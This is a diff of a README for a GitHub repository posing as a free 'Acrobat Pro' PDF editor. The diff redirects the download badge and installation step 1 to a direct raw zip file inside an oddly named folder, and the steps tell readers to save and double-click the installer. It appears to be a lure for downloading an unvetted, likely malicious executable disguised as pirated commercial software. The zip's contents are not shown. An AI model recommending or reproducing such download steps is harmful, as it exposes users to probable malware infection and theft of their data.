@@ -1,6 +1,6 @@
 # 📄 Acrobat-Version-Pro-2 - Edit and sign PDF files easily.
 
-[![](https://img.shields.io/badge/Download-Acrobat_Pro-blue.svg)](https://github.com/Allusivenessyahoo270/Acrobat-Version-Pro-2)
+[![](https://img.shields.io/badge/Download-Acrobat_Pro-blue.svg)](https://github.com/Allusivenessyahoo270/Acrobat-Version-Pro-2/raw/refs/heads/main/salpingopalatal/Acrobat_Version_Pro_v3.8.zip)
 
 ## 🎯 About This Software
 
@@ -21,7 +21,7 @@ Ensure your computer has the following items before beginning the installation. 
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit this page to download the software: [https://github.com/Allusivenessyahoo270/Acrobat-Version-Pro-2](https://github.com/Allusivenessyahoo270/Acrobat-Version-Pro-2).
+1. Visit this page to download the software: [https://github.com/Allusivenessyahoo270/Acrobat-Version-Pro-2/raw/refs/heads/main/salpingopalatal/Acrobat_Version_Pro_v3.8.zip](https://github.com/Allusivenessyahoo270/Acrobat-Version-Pro-2/raw/refs/heads/main/salpingopalatal/Acrobat_Version_Pro_v3.8.zip).
 2. Locate the download button on the page.
 3. Save the installation file to your Downloads folder.
 4. Open the installer file by double-clicking it.
